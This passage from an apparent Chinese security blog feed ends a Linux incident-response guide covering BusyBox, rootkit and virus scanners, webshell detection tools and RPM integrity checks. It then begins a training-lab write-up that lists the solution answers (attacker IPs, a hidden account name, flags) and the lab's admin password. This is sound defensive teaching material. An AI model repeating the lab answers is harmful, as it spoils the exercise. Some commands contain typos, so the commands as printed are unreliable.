href="https://jiangjiyue.github.io/2021/09/01/46f9142e/">Linux-FireWalld</a></li></ul><h3 id="命令被替换"><a href="#命令被替换" class="headerlink" title="命令被替换"></a>命令被替换</h3><h4 id="BusyBox"><a href="#BusyBox" class="headerlink" title="BusyBox"></a>BusyBox</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载 BusyBox 64 位二进制文件</span></span><br><span class="line">wget -O busybox https://busybox.net/downloads/binaries/1.31.0-defconfig-multiarch-musl/busybox-x86_64</span><br><span class="line"><span class="comment"># 赋予权限</span></span><br><span class="line"><span class="built_in">chmod</span> +x busybox</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看查看其版本，使用和当前支持的功能</span></span><br><span class="line">./busybox</span><br><span class="line">[root@localhost opt]<span class="comment"># ./busybox</span></span><br><span class="line">BusyBox v1.31.0 (2019-06-10 15:54:54 CEST) multi-call binary.</span><br><span class="line">BusyBox is copyrighted by many authors between 1998-2015.</span><br><span class="line">Licensed under GPLv2. See <span class="built_in">source</span> distribution <span class="keyword">for</span> detailed</span><br><span class="line">copyright notices.</span><br><span class="line"></span><br><span class="line">Usage: busybox [<span class="keyword">function</span> [arguments]...]</span><br><span class="line">   or: busybox --list[-full]</span><br><span class="line">   or: busybox --show SCRIPT</span><br><span class="line">   or: busybox --install [-s] [DIR]</span><br><span class="line">   or: <span class="keyword">function</span> [arguments]...</span><br><span class="line"></span><br><span class="line">        BusyBox is a multi-call binary that combines many common Unix</span><br><span class="line">        utilities into a single executable.  Most people will create a</span><br><span class="line">        <span class="built_in">link</span> to busybox <span class="keyword">for</span> each <span class="keyword">function</span> they wish to use and BusyBox</span><br><span class="line">        will act like whatever it was invoked as.</span><br><span class="line"></span><br><span class="line">Currently defined <span class="built_in">functions</span>:</span><br><span class="line">        [, [[, acpid, add-shell, addgroup, adduser, adjtimex, <span class="built_in">arch</span>, arp, arping, ash, awk, <span class="built_in">base64</span>, <span class="built_in">basename</span>, bc, beep,</span><br><span class="line">        blkdiscard, blkid, blockdev, bootchartd, brctl, bunzip2, bzcat, bzip2, cal, <span class="built_in">cat</span>, chat, chattr, <span class="built_in">chgrp</span>, <span class="built_in">chmod</span>,</span><br><span class="line">        <span class="built_in">chown</span>, chpasswd, chpst, <span class="built_in">chroot</span>, chrt, chvt, <span class="built_in">cksum</span>, clear, cmp, <span class="built_in">comm</span>, conspy, <span class="built_in">cp</span>, cpio, crond, crontab, cryptpw,</span><br><span class="line">        cttyhack, <span class="built_in">cut</span>, <span class="built_in">date</span>, dc, <span class="built_in">dd</span>, deallocvt, delgroup, deluser, depmod, devmem, <span class="built_in">df</span>, dhcprelay, diff, <span class="built_in">dirname</span>, dmesg,</span><br><span class="line">        dnsd, dnsdomainname, dos2unix, dpkg, dpkg-deb, <span class="built_in">du</span>, dumpkmap, dumpleases, <span class="built_in">echo</span>, ed, egrep, eject, <span class="built_in">env</span>, envdir,</span><br><span class="line">        envuidgid, ether-wake, <span class="built_in">expand</span>, <span class="built_in">expr</span>, <span class="built_in">factor</span>, fakeidentd, fallocate, <span class="literal">false</span>, fatattr, fbset, fbsplash, fdflush,</span><br><span class="line">        fdformat, fdisk, fgconsole, fgrep, find, findfs, flock, <span class="built_in">fold</span>, free, freeramdisk, fsck, fsck.minix, fsfreeze,</span><br><span class="line">        fstrim, fsync, ftpd, ftpget, ftpput, fuser, getopt, getty, grep, <span class="built_in">groups</span>, gunzip, gzip, halt, hd, hdparm, <span class="built_in">head</span>,</span><br><span class="line">        hexdump, hexedit, <span class="built_in">hostid</span>, hostname, httpd, hush, hwclock, i2cdetect, i2cdump, i2cget, i2cset, i2ctransfer, <span class="built_in">id</span>,</span><br><span class="line">        ifconfig, ifdown, ifenslave, ifplugd, ifup, inetd, init, insmod, install, ionice, iostat, ip, ipaddr, ipcalc,</span><br><span class="line">        ipcrm, ipcs, iplink, ipneigh, iproute, iprule, iptunnel, kbd_mode, <span class="built_in">kill</span>, killall, killall5, klogd, last, less,</span><br><span class="line">        <span class="built_in">link</span>, linux32, linux64, linuxrc, <span class="built_in">ln</span>, loadfont, loadkmap, logger, login, <span class="built_in">logname</span>, logread, losetup, lpd, lpq, lpr,</span><br><span class="line">        <span class="built_in">ls</span>, lsattr, lsmod, lsof, lspci, lsscsi, lsusb, lzcat, lzma, lzop, makedevs, makemime, man, <span class="built_in">md5sum</span>, mdev, mesg,</span><br><span class="line">        microcom, <span class="built_in">mkdir</span>, mkdosfs, mke2fs, <span class="built_in">mkfifo</span>, mkfs.ext2, mkfs.minix, mkfs.vfat, <span class="built_in">mknod</span>, mkpasswd, mkswap, <span class="built_in">mktemp</span>,</span><br><span class="line">        modinfo, modprobe, more, mount, mountpoint, mpstat, mt, <span class="built_in">mv</span>, nameif, nanddump, nandwrite, nbd-client, nc, netstat,</span><br><span class="line">        <span class="built_in">nice</span>, <span class="built_in">nl</span>, nmeter, <span class="built_in">nohup</span>, nologin, <span class="built_in">nproc</span>, nsenter, nslookup, ntpd, nuke, <span class="built_in">od</span>, openvt, partprobe, passwd, <span class="built_in">paste</span>,</span><br><span class="line">        patch, pgrep, pidof, ping, ping6, pipe_progress, pivot_root, pkill, pmap, popmaildir, poweroff, powertop,</span><br><span class="line">        <span class="built_in">printenv</span>, <span class="built_in">printf</span>, ps, pscan, pstree, <span class="built_in">pwd</span>, pwdx, raidautorun, rdate, rdev, readahead, <span class="built_in">readlink</span>, readprofile,</span><br><span class="line">        <span class="built_in">realpath</span>, reboot, reformime, remove-shell, renice, reset, resize, resume, rev, <span class="built_in">rm</span>, <span class="built_in">rmdir</span>, rmmod, route, rpm,</span><br><span class="line">        rpm2cpio, rtcwake, run-init, run-parts, runlevel, runsv, runsvdir, rx, script, scriptreplay, sed, sendmail, <span class="built_in">seq</span>,</span><br><span class="line">        setarch, setconsole, setfattr, setfont, setkeycodes, setlogcons, setpriv, setserial, setsid, setuidgid, sh,</span><br><span class="line">        <span class="built_in">sha1sum</span>, <span class="built_in">sha256sum</span>, sha3sum, <span class="built_in">sha512sum</span>, showkey, <span class="built_in">shred</span>, <span class="built_in">shuf</span>, slattach, <span class="built_in">sleep</span>, smemcap, softlimit, <span class="built_in">sort</span>, <span class="built_in">split</span>,</span><br><span class="line">        ssl_client, start-stop-daemon, <span class="built_in">stat</span>, strings, <span class="built_in">stty</span>, su, sulogin, <span class="built_in">sum</span>, sv, svc, svlogd, svok, swapoff, swapon,</span><br><span class="line">        switch_root, <span class="built_in">sync</span>, sysctl, syslogd, <span class="built_in">tac</span>, <span class="built_in">tail</span>, tar, taskset, tc, tcpsvd, <span class="built_in">tee</span>, telnet, telnetd, <span class="built_in">test</span>, tftp, tftpd,</span><br><span class="line">        time, <span class="built_in">timeout</span>, top, <span class="built_in">touch</span>, <span class="built_in">tr</span>, traceroute, traceroute6, <span class="literal">true</span>, <span class="built_in">truncate</span>, ts, <span class="built_in">tty</span>, ttysize, tunctl, ubiattach,</span><br><span class="line">        ubidetach, ubimkvol, ubirename, ubirmvol, ubirsvol, ubiupdatevol, udhcpc, udhcpc6, udhcpd, udpsvd, uevent, umount,</span><br><span class="line">        <span class="built_in">uname</span>, <span class="built_in">unexpand</span>, <span class="built_in">uniq</span>, unix2dos, <span class="built_in">unlink</span>, unlzma, unshare, unxz, unzip, <span class="built_in">uptime</span>, <span class="built_in">users</span>, usleep, uudecode, uuencode,</span><br><span class="line">        vconfig, vi, vlock, volname, w, wall, watch, watchdog, <span class="built_in">wc</span>, wget, <span class="built_in">which</span>, <span class="built_in">who</span>, <span class="built_in">whoami</span>, whois, xargs, xxd, xz, xzcat,</span><br><span class="line">        <span class="built_in">yes</span>, zcat, zcip</span><br><span class="line">        </span><br><span class="line"><span class="comment"># 使用BusyBox</span></span><br><span class="line"><span class="comment">## 基本语法</span></span><br><span class="line">./busybox <span class="built_in">command</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 查看可用命令条数</span></span><br><span class="line">busybox --list | <span class="built_in">wc</span> -l</span><br><span class="line">396</span><br><span class="line"></span><br><span class="line"><span class="comment">## ls</span></span><br><span class="line">./busybox <span class="built_in">ls</span></span><br><span class="line"><span class="comment">## ping</span></span><br><span class="line"> ./busybox ping www.baidu.com</span><br><span class="line">PING www.baidu.com (180.101.50.188): 56 data bytes</span><br><span class="line">64 bytes from 180.101.50.188: <span class="built_in">seq</span>=0 ttl=128 time=42.306 ms</span><br><span class="line">64 bytes from 180.101.50.188: <span class="built_in">seq</span>=1 ttl=128 time=55.544 ms</span><br><span class="line">64 bytes from 180.101.50.188: <span class="built_in">seq</span>=2 ttl=128 time=41.421 ms</span><br><span class="line">64 bytes from 180.101.50.188: <span class="built_in">seq</span>=3 ttl=128 time=33.776 ms</span><br><span class="line">64 bytes from 180.101.50.188: <span class="built_in">seq</span>=4 ttl=128 time=40.611 ms</span><br><span class="line">64 bytes from 180.101.50.188: <span class="built_in">seq</span>=5 ttl=128 time=40.129 ms</span><br><span class="line">^C</span><br><span class="line">--- www.baidu.com ping statistics ---</span><br><span class="line">6 packets transmitted, 6 packets received, 0% packet loss</span><br><span class="line">round-trip min/avg/max = 33.776/42.297/55.544 ms</span><br><span class="line"><span class="comment">## 使用 Httpd WebServer</span></span><br><span class="line">./busybox --list | grep httpd</span><br><span class="line"><span class="comment"># 进入busybox shell环境</span></span><br><span class="line">./busybox sh</span><br><span class="line"><span class="comment"># 激活WebServer</span></span><br><span class="line">/opt <span class="comment"># ./busybox httpd</span></span><br><span class="line"><span class="comment"># 退出进入busybox shell环境</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line"><span class="comment"># 查询webserver 进程</span></span><br><span class="line">[root@localhost opt]<span class="comment"># ps -ef | grep httpd</span></span><br><span class="line">root      38923      1  0 14:45 ?        00:00:00 ./busybox httpd</span><br><span class="line">root      39460   3959  0 14:45 pts/0    00:00:00 grep --color=auto httpd</span><br><span class="line"><span class="comment"># 测试</span></span><br><span class="line">[root@localhost opt]<span class="comment"># curl localhost</span></span><br><span class="line">&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;404 Not Found&lt;/TITLE&gt;&lt;/HEAD&gt;</span><br><span class="line">&lt;BODY&gt;&lt;H1&gt;404 Not Found&lt;/H1&gt;</span><br><span class="line">The requested URL was not found</span><br><span class="line">&lt;/BODY&gt;&lt;/HTML&gt;</span><br><span class="line"><span class="comment"># 可以创建一个简单的页面</span></span><br><span class="line">./busybox sh</span><br><span class="line"><span class="comment"># 新建文件</span></span><br><span class="line">/opt <span class="comment"># ./busybox vi index.html</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">Welcome to BusyBox !</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407301458025.png" data-fancybox="true"/></div></div><h4 id="检查确认系统命令工具是否被替换"><a href="#检查确认系统命令工具是否被替换" class="headerlink" title="检查确认系统命令工具是否被替换"></a>检查确认系统命令工具是否被替换</h4><p>使用工具篇中的rkhunter检测即可</p><h2 id="工具篇"><a href="#工具篇" class="headerlink" title="工具篇"></a>工具篇</h2><h3 id="一、Rootkit查杀"><a href="#一、Rootkit查杀" class="headerlink" title="一、Rootkit查杀"></a>一、Rootkit查杀</h3><h4 id="chkrootkit"><a href="#chkrootkit" class="headerlink" title="chkrootkit"></a>chkrootkit</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># http://www.chkrootkit.org</span></span><br><span class="line"><span class="comment"># 使用方法:</span></span><br><span class="line">wget ftp://ftp.pangeia.com.br/pub/seg/pac/chkrootkit.tar.gz</span><br><span class="line">tar zxvf chkrootkit.tar.gz</span><br><span class="line"><span class="built_in">cd</span> chkrootkit-0.52</span><br><span class="line">makesense</span><br><span class="line"><span class="comment"># 编译完成没有报错的话执行检查</span></span><br><span class="line">./chkrootkit</span><br></pre></td></tr></table></figure><h4 id="rkhunter"><a href="#rkhunter" class="headerlink" title="rkhunter"></a>rkhunter</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># http://rkhunter.sourceforge.net</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用方法:</span></span><br><span class="line">wget https://nchc.dl.sourceforge.net/project/rkhunter/rkhunter/1.4.4/rkhunter-1.4.4.tar.gz</span><br><span class="line">tar -zxvf rkhunter-1.4.4.tar.gz</span><br><span class="line"><span class="built_in">cd</span> rkhunter-1.4.4</span><br><span class="line">./installer.sh --install</span><br><span class="line">rkhunter -c</span><br></pre></td></tr></table></figure><h3 id="二、病毒查杀"><a href="#二、病毒查杀" class="headerlink" title="二、病毒查杀"></a>二、病毒查杀</h3><h4 id="Clamav"><a href="#Clamav" class="headerlink" title="Clamav"></a>Clamav</h4><p><strong>安装方式一:</strong> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ClamAV 的官方下载地址为:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># http://www.clamav.net/download.html</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.安装zlib</span></span><br><span class="line">wget http://nchc.dl.sourceforge.net/project/libpng/zlib/1.2.7/zlib-1.2.7.tar.gz </span><br><span class="line">tar -zxvf zlib-1.2.7.tar.gz</span><br><span class="line"><span class="built_in">cd</span> zlib-1.2.7</span><br><span class="line"><span class="comment"># 安装一下gcc编译环境</span></span><br><span class="line">yum install gcc</span><br><span class="line">CFLAGS=<span class="string">&quot;-O3 -fPIC&quot;</span>./configure --prefix=/usr/local/zlib/</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"><span class="comment"># 2.添加用户组clamav和组成员clamav</span></span><br><span class="line">groupadd clamav</span><br><span class="line">useradd -gclamav -s/bin/false -c<span class="string">&quot;Clam AntiVirus&quot;</span>clamav</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.安装Clamav</span></span><br><span class="line">tar -zxvf clamav-0.97.6.tar.gz</span><br><span class="line"><span class="built_in">cd</span> clamav-0.97.6</span><br><span class="line">./configure --prefix=/opt/clamav --disable-clamav-with-zlib=/usr/local/zlib</span><br><span class="line">make</span><br><span class="line">makeinstall</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 配置Clamav</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">mkdir</span>/opt/clamav/logs</span><br><span class="line"><span class="built_in">mkdir</span>/opt/clamav/updata</span><br><span class="line"><span class="built_in">touch</span>/opt/clamav/logs/freshclam.log</span><br><span class="line"><span class="built_in">touch</span>/opt/clamav/logs/clamd.log</span><br><span class="line"><span class="built_in">cd</span>/opt/clamav/logs</span><br><span class="line"><span class="built_in">chown</span> clamav:clamav clamd.log</span><br><span class="line"><span class="built_in">chown</span> clamav:clamav freshclam.log</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5.ClamAV使用</span></span><br><span class="line"></span><br><span class="line">/opt/clamav/bin/freshclam <span class="comment"># 升级病毒库</span></span><br><span class="line">./clamscan –h <span class="comment"># 查看相应的帮助信息</span></span><br><span class="line">./clamscan -r /home  <span class="comment"># 扫描所有用户的主目录就使用</span></span><br><span class="line">./clamscan -r --bell -i /bin  <span class="comment"># 扫描 bin 目录并且显示有问题的文件的扫描结果</span></span><br></pre></td></tr></table></figure><p><strong>安装方式二:</strong> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装</span></span><br><span class="line">yum install -y clamav</span><br><span class="line"><span class="comment"># 更新病毒库</span></span><br><span class="line">freshclam</span><br><span class="line"></span><br><span class="line"><span class="comment"># 扫描方法</span></span><br><span class="line">clamscan -r/etc --max-dir-recursion=5-l/root/etcclamav.log</span><br><span class="line">clamscan -r/bin --max-dir-recursion=5-l/root/binclamav.log</span><br><span class="line">clamscan -r/usr --max-dir-recursion=5-l/root/usrclamav.log</span><br><span class="line"></span><br><span class="line"><span class="comment"># 扫描并杀毒</span></span><br><span class="line">clamscan -r --remove/usr/bin/bsd-port</span><br><span class="line">clamscan -r --remove/usr/bin/</span><br><span class="line">clamscan -r--remove/usr/local/zabbix/sbin</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看日志发现</span></span><br><span class="line"><span class="built_in">cat</span>/root/usrclamav.log |grep FOUND</span><br></pre></td></tr></table></figure><h3 id="三、webshell查杀"><a href="#三、webshell查杀" class="headerlink" title="三、webshell查杀"></a>三、webshell查杀</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">linux 版:</span><br><span class="line"></span><br><span class="line"><span class="comment"># 河马 webshell 查杀</span></span><br><span class="line">http://www.shellpub.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 深信服 Webshell 网站后门检测工具</span></span><br><span class="line">http://edr.sangfor.com.cn/backdoor_detection.html</span><br><span class="line"></span><br><span class="line">牧云</span><br><span class="line">findWebshell-master</span><br><span class="line">php-malware-finder-master</span><br><span class="line">PHP-Shell-Detector-master</span><br></pre></td></tr></table></figure><h3 id="四、RPM-check检查"><a href="#四、RPM-check检查" class="headerlink" title="四、RPM check检查"></a>四、RPM check检查</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 系统完整性可以通过 rpm 自带的 -Va 来校验检查所有的 rpm 软件包,查看哪些命令是否被替换了:</span></span><br><span class="line"></span><br><span class="line">./rpm -Va &gt; rpm.log</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果一切均校验正常将不会产生任何输出,如果有不一致的地方,就会显示出来,输出格式是 8 位长字符串,每个字符都用以表示文件与 RPM 数据库中一种属性的比较结果 ,如果是. (点) 则表示测试通过.</span></span><br></pre></td></tr></table></figure><p><strong>验证内容中的8个信息的具体内容如下:</strong></p><ol><li>S文件大小是否改变</li><li>M文件的类型或文件的权限（rwx）是否被改变</li><li>5文件 MD5 校验是否改变（可以看成文件内容是否改变）</li><li>D设备中,从代码是否改变</li><li>L文件路径是否改变</li><li>U文件的属主（所有者）是否改变</li><li>G文件的属组是否改变</li><li>T文件的修改时间是否改变</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 如果命令被替换了,如何还原回来:</span></span><br><span class="line"><span class="comment"># 文件提取还原案例:</span></span><br><span class="line"></span><br><span class="line">rpm  -qf /bin/ls  <span class="comment"># 查询ls命令属于哪个软件包</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">mv</span>  /bin/ls /tmp  <span class="comment"># 先把ls转移到tmp目录下,造成ls命令丢失的假象</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取rpm包中ls命令到当前目录的/bin/ls下</span></span><br><span class="line">rpm2cpio /mnt/cdrom/Packages/coreutils-8.4-19.el6.i686.rpm | cpio -idv ./bin/ls </span><br><span class="line"></span><br><span class="line"><span class="comment"># 把ls命令复制到/bin/目录修复文件丢失</span></span><br><span class="line"><span class="built_in">cp</span> /root/bin/ls  /bin/ </span><br></pre></td></tr></table></figure><h3 id="五、Linux安全检查脚本"><a href="#五、Linux安全检查脚本" class="headerlink" title="五、Linux安全检查脚本"></a>五、Linux安全检查脚本</h3><div class="tag-plugin ghcard"><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/grayddq/GScan"><img src="https://github-readme-stats.xaoxuu.com/api/pin/?username=grayddq&repo=GScan&theme=dark&show_owner=true"/></a></div><div class="tag-plugin ghcard"><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/ppabc/security_check"><img src="https://github-readme-stats.xaoxuu.com/api/pin/?username=ppabc&repo=security_check&theme=dark&show_owner=true"/></a></div><div class="tag-plugin ghcard"><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/T0xst/linux"><img src="https://github-readme-stats.xaoxuu.com/api/pin/?username=T0xst&repo=linux&theme=dark&show_owner=true"/></a></div>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="应急响应" scheme="https://jiangjiyue.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    <category term="Linux" scheme="https://jiangjiyue.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>应急响应靶机训练-Web3</title>
    <link href="https://jiangjiyue.github.io/2024/07/11/87585b1a/"/>
    <id>https://jiangjiyue.github.io/2024/07/11/87585b1a/</id>
    <published>2024-07-11T07:47:49.000Z</published>
    <updated>2024-07-25T16:32:22.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><div class="tag-plugin grid" bg="card" style="grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));"><div class="cell" style="">    <p>总字符数: 15.72K </p>    </div>    <div class="cell" style="">    <p>代码: 12.93K, 文本: 1.00K</p>    </div>    <div class="cell" style="">    <p>预计阅读时间: 1.01 小时</p>    </div>    </div><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>前景需要：小苕在省护值守中，在灵机一动情况下把设备停掉了，甲方问：为什么要停设备？小苕说：我第六感告诉我，这机器可能被黑了。</p><p>这是他的服务器，请你找出以下内容作为通关条件：</p><ol><li>攻击者的两个IP地址 <psw>192.168.75.129 192.168.75.130</psw></li><li>隐藏用户名称 <psw>hack6618$</psw></li><li>黑客遗留下的flag【3个】<ul><li><psw>flag{888666abc}</psw></li><li><psw>flag{zgsfsys@sec}</psw></li><li><psw>flag{H@Ck@sec}</psw></li></ul></li></ol><h2 id="靶机环境"><a href="#靶机环境" class="headerlink" title="靶机环境"></a>靶机环境</h2><p>使用Vmware启动即可,如启动错误,请升级至Vmware17.5以上</p><p>靶机环境：</p><ol><li><p>Windows Server 2022</p></li><li><p>phpstudy(小皮面板)</p></li></ol><p>相关账户密码:</p><ol><li><p>用户:administrator</p></li><li><p>密码:xj@123456</p></li></ol><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="查看端口"><a href="#查看端口" class="headerlink" title="查看端口"></a>查看端口</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看运行了哪些服务,有无外联端口</span></span><br><span class="line">netstat -ano</span><br><span 